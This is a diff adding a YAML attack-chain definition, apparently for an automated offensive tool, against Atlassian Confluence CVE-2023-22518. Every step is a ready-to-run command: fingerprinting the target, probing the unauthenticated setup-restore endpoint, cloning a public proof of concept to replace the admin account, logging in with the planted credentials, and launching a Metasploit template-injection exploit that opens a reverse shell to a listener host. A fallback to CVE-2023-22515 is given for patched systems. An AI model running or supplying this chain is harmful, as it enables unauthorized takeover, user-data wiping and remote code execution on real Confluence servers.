@@ -1,0 +1,63 @@
+chain_id: confluence_cve_2023_22518
+title: "Atlassian Confluence — CVE-2023-22518 unauth setup endpoint → admin reset"
+severity: CRITICAL
+tags: [web, confluence, atlassian, cve-2023-22518, auth-bypass, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-22518" }
+    - { banner_pattern: "(?i)atlassian|confluence" }
+    - { product_pattern: "(?i)confluence" }
+    - { path_pattern: "(?i)/(setup/setupadministrator|json/setup-restore)" }
+
+description: |
+  Confluence Server / DC pre-7.19.16 / 8.3.4 / 8.4.4 / 8.5.3 / 8.6.1:
+  the `setup-restore` endpoint accepts a "fresh-install" backup ZIP
+  unauthenticated, lets you wipe the existing user table and seed a
+  brand-new admin. From there, the post-foothold RCE follows from
+  any of the existing Confluence template / plugin vectors. CISA-
+  flagged Nov 2023, used by Cerber ransomware.
+
+steps:
+  - id: 1
+    title: "Fingerprint Confluence"
+    command: |
+      curl -sk -I "https://$VICTIMA/" | grep -i 'atlassian\\|confluence'
+      curl -sk "https://$VICTIMA/server-info.action" -I
+      curl -sk "https://$VICTIMA/login.action" | grep -Eo 'Confluence [0-9.]+' | head -1
+
+  - id: 2
+    title: "Probe the setup endpoint"
+    command: |
+      curl -sk -i "https://$VICTIMA/json/setup-restore.action" -I
+
+  - id: 3
+    title: "Public PoC: reset admin to your password via the restore"
+    command: |
+      git clone https://github.com/W01fh4cker/cve-2023-22518-RCE /tmp/cf22518
+      python3 /tmp/cf22518/CVE-2023-22518.py -u https://$VICTIMA \
+        -n rootctl -p Rootctl123!
+
+  - id: 4
+    title: "Log in with the new admin"
+    command: |
+      curl -sk -c /tmp/cf.jar "https://$VICTIMA/dologin.action" \
+        --data 'os_username=rootctl&os_password=Rootctl123!&login=Log+in&os_destination='
+
+  - id: 5
+    title: "RCE — Velocity template editor (admin → SYSTEM)"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/atlassian_confluence_velocity_app; \
+        set RHOSTS $VICTIMA; set USERNAME rootctl; set PASSWORD Rootctl123!; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+common_errors:
+  - error: "/json/setup-restore returns 401 / 403"
+    solution: |
+      Patched. Quickly check CVE-2023-22515 (improper auth on
+      `/setup/setupadministrator.action`) — same era, same outcome,
+      different endpoint.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-22518
+  - https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-vulnerability-in-confluence-data-center-and-server-1311473907.html
